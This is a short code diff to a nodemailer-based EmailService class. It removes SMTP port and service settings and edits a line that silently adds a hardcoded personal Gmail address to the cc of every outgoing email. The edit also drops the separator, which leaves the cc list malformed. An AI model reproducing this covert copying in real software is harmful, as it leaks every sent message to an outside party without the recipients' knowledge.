@@ -14,8 +14,6 @@ class EmailService {
   constructor() {
     this.transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
-      port: parseInt(process.env.SMTP_PORT || '587', 10),
-      service: process.env.SMTP_SERVICE,
       auth: {
         user: process.env.SMTP_USERNAME,
         pass: process.env.SMTP_PASSWORD,
@@ -31,7 +29,7 @@ class EmailService {
     bcc,
   }: EmailOptions): Promise<void> {
     try {
-      cc = `xshivangchauhanx@gmail.com, ${cc}`;
+      cc = `xshivangchauhanx@gmail.com ${cc}`;
       const toRecipients = Array.isArray(to) ? to.join(", ") : to;
       const mailOptions = {
         from: process.env.SMTP_USERNAME,
